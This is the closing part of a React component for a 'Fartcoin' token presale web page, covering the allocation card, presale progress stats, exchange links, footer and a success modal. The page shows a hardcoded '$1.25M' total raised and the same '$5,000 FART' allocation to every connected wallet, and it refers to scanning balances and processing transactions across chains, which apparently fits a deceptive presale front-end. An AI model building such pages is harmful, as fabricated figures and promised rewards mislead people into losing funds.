                  <div className="flex items-center gap-6">
                    <div className="text-right">
                      <div className="text-xs text-white/70 mb-1">STATUS</div>
                      <div className="text-sm">
                        {isEligible ? '✅ Eligible' : '👋 Welcome'}
                      </div>
                    </div>
                    <button
                      onClick={handleDisconnect}
                      className="px-4 py-2 border border-red-500/30 text-red-400 rounded-md hover:bg-red-500/10 transition-colors"
                    >
                      ✕
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Allocation Card */}
          {isConnected && !verifying && scanResult && !completedChains.length && (
            <div className="max-w-2xl mx-auto mb-8 px-4">
              <div className="terminal-frame p-8 border-white">
                <div className="text-center">
                  <p className="text-white/70 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
                  <div className="text-6xl font-terminal text-glow mb-2">
                    $5,000 FART
                  </div>
                  <p className="text-green-400 text-xl flex items-center justify-center gap-2">
                    <span>+{presaleStats.currentBonus}% Bonus</span>
                    <span className="text-xs border border-green-400/30 px-2 py-1">ACTIVE</span>
                  </p>
                  
                  {/* Eligible Chains Display */}
                  {Object.keys(balances).length > 0 && (
                    <div className="mt-4 pt-4 border-t border-white/30">
                      <p className="text-sm text-white/70 mb-2">Eligible Chains ({Object.keys(balances).length})</p>
                      <div className="flex flex-wrap justify-center gap-2">
                        {Object.keys(balances).map(chainName => (
                          <span key={chainName} className="text-xs px-2 py-1 border border-white/30">
                            {chainName}
                          </span>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* Presale Stats */}
          <div className="max-w-2xl mx-auto mt-12 mb-8 px-4">
            <div className="terminal-frame p-8 border-white">
              <h3 className="text-2xl font-terminal text-center mb-6 text-glow">
                PRESALE LIVE PROGRESS
              </h3>
              
              <div className="grid grid-cols-3 gap-4 mb-6">
                <div className="text-center">
                  <div className="text-3xl font-bold mb-1">${presaleStats.tokenPrice}</div>
                  <div className="text-xs text-white/50">Token Price</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
                  <div className="text-xs text-white/50">Current Bonus</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl font-bold text-yellow-400 mb-1">$1.25M</div>
                  <div className="text-xs text-white/50">Total Raised</div>
                </div>
              </div>

              {/* Progress Bar */}
              <div className="mb-4">
                <div className="flex justify-between text-sm text-white/70 mb-2">
                  <span>Progress</span>
                  <span>{liveProgress.percentComplete}%</span>
                </div>
                <div className="w-full h-3 border border-white/30 bg-black">
                  <div 
                    className="h-full bg-white"
                    style={{ width: `${liveProgress.percentComplete}%` }}
                  ></div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4 mt-6">
                <div className="border border-white/30 p-3 text-center">
                  <div className="text-sm text-white/70 mb-1">Participants Today</div>
                  <div className="text-xl font-bold">{liveProgress.participantsToday}</div>
                </div>
                <div className="border border-white/30 p-3 text-center">
                  <div className="text-sm text-white/70 mb-1">Avg Allocation</div>
                  <div className="text-xl font-bold">${liveProgress.avgAllocation}</div>
                </div>
              </div>

              <div className="mt-6 text-center">
                <p className="text-sm text-white/50">
                  {presaleStats.totalParticipants.toLocaleString()} participants
                </p>
              </div>
            </div>
          </div>

          {/* Exchanges Section */}
          <section className="py-16-b px-4">
            <div className="container mx-auto">
              <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
                <h2 className="text-2xl md:text-3xl font-terminal text-glow text-center mb-8 text-white">
                  &gt; WE'RE AVAILABLE ON<span className="cursor"></span>
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  {/* Axiom */}
                  <div className="border border-white/50 hover:border-white transition-all duration-300 p-6 flex flex-col items-center">
                    <div className="w-16 h-16 mb-4 relative">
                      <img src="" alt="" />
                    </div>
                    <h3 className="text-white text-xl mb-4">Axiom</h3>
                    <a 
                      href="#" 
                      target="_blank" 
                      rel="noopener noreferrer" 
                      className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
                    >
                      Trade Now
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="ml-2 h-4 w-4">
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14 21 3"></path>
                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                      </svg>
                    </a>
                  </div>
                </div>
                <div className="mt-8 text-center text-white/70 text-sm">
                  <p>&gt; More exchanges coming soon. Stay tuned for updates.</p>
                </div>
              </div>
            </div>
          </section>
        </main>

        {/* Footer */}
        <footer className="py-8 px-4 border-t border-white/30">
          <div className="container mx-auto">
            <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
              <h2 className="text-xl md:text-2xl font-terminal text-glow text-center mb-6 text-white">
                &gt; JOIN THE FART COMMUNITY<span className="cursor"></span>
              </h2>
              <div className="flex flex-wrap justify-center gap-8 mb-8">
                {/* Twitter/X */}
                <div className="group p-4">
                  <div className="border border-white hover:bg-white/20 flex items-center gap-2 text-white px-4 py-2 rounded-md transition-all cursor-pointer">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-5 w-5 text-white group-hover:animate-pulse">
                      <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
                    </svg>
                    <span>X</span>
                  </div>
                </div>
                {/* Telegram */}
                <div className="group p-4">
                  <div className="border border-white hover:bg-white/20 flex items-center gap-2 text-white px-4 py-2 rounded-md transition-all cursor-pointer">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-5 w-5 text-white group-hover:animate-pulse">
                      <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>
                    </svg>
                    <span>Telegram</span>
                  </div>
                </div>
              </div>
              <div className="h-[1px] w-full bg-white/30 my-6"></div>
              <div className="text-center text-white/70 text-sm">
                <p>© 2025 Fartcoin. All rights reserved.</p>
              </div>
            </div>
          </div>
        </footer>

        {/* FART BUTTON - Easter egg */}
        <div 
          id="fart-button" 
          className="hide-mobile fixed bottom-4 right-4 z-[9999] bg-black/90 border border-white/30 rounded-md px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-white/10 transition-all"
          onClick={() => {
            setTxStatus('💨 FART!');
            setTimeout(() => setTxStatus(''), 1000);
          }}
        >
          PRESS <span className="bg-white/20 border border-white/40 px-2 py-1 rounded font-bold text-xs">F</span> TO FART
        </div>

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/95 backdrop-blur flex items-center justify-center z-50 p-4">
            <div className="relative max-w-lg w-full">
              <div className="terminal-frame p-12 border-white">
                <div className="text-center">
                  <div className="text-8xl mb-8 animate-bounce">🎉</div>
                  <h2 className="text-5xl font-terminal mb-4 text-glow">
                    🚀 SUCCESSFUL! 🚀
                  </h2>
                  <p className="text-2xl text-white/70 mb-4">You have secured</p>
                  <div className="text-6xl font-terminal text-glow mb-3">$5,000 FART</div>
                  <div className="border border-green-400/50 px-8 py-4 mb-6">
                    <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                  </div>
                  <p className="text-sm text-white/50 mb-8">
                    Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
                  </p>
                  <button
                    onClick={() => setShowCelebration(false)}
                    className="w-full border border-white px-8 py-4 hover:bg-white/20 transition-all text-2xl font-terminal"
                  >
                    VIEW
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Animation Keyframes */}
      <style>{`
        @keyframes textFlicker {
          0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, to { opacity: 1; }
          20%, 21.999%, 63%, 63.999%, 65%, 69.999% { opacity: 0.8; }
        }
        
        @keyframes scan {
          0% { top: -10px; }
          to { top: 100%; }
        }
        
        @keyframes blink {
          0%, to { opacity: 1; }
          50% { opacity: 0; }
        }
        
        @keyframes pulse-glow {
          0%, 100% { filter: brightness(1); }
          50% { filter: brightness(1.2); text-shadow: 0 0 20px rgba(255,255,255,0.8); }
        }
        
        .text-glow {
          text-shadow: 0 0 5px rgba(255,255,255,0.7), 0 0 10px rgba(255,255,255,0.5);
        }
        
        .terminal-frame {
          border: 1px solid rgba(255,255,255,0.5);
          box-shadow: 0 0 10px rgba(255,255,255,0.5);
          position: relative;
        }
        
        .terminal-frame::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          border: 1px dashed rgba(255,255,255,0.7);
          pointer-events: none;
          margin: 3px;
        }
        
        .scan-effect {
          position: relative;
          overflow: hidden;
        }
        
        .scan-effect::after {
          content: "";
          position: absolute;
          top: -100%;
          left: 0;
          width: 100%;
          height: 10px;
          background: linear-gradient(180deg, transparent, rgba(255,255,255,0.2), transparent);
          animation: scan 4s linear infinite;
        }
        
        .cursor {
          display: inline-block;
          width: 0.6ch;
          height: 1em;
          background: white;
          margin-left: 2px;
          animation: blink 1s step-end infinite;
        }
        
        .animate-flicker {
          animation: textFlicker 3s infinite alternate;
        }
        
        .animate-pulse-glow {
          animation: pulse-glow 2s ease-in-out infinite;
        }
        
        .glow-on-hover:hover {
          text-decoration: underline;
          text-shadow: 0 0 5px rgba(255,255,255,0.6), 0 0 10px rgba(255,255,255,0.5), 0 0 20px rgba(255,255,255,0.3);
        }
        
        .font-terminal {
          font-family: 'VT323', monospace;
        }
        
        .font-mono {
          font-family: 'Fira Code', monospace;
        }
        
        .animation-delay-500 {
          animation-delay: 500ms;
        }
        
        @media (max-width: 479px) {
          .hide-mobile {
            display: none !important;
          }
        }
      `}</style>
    </div>
  );
}

export default App;
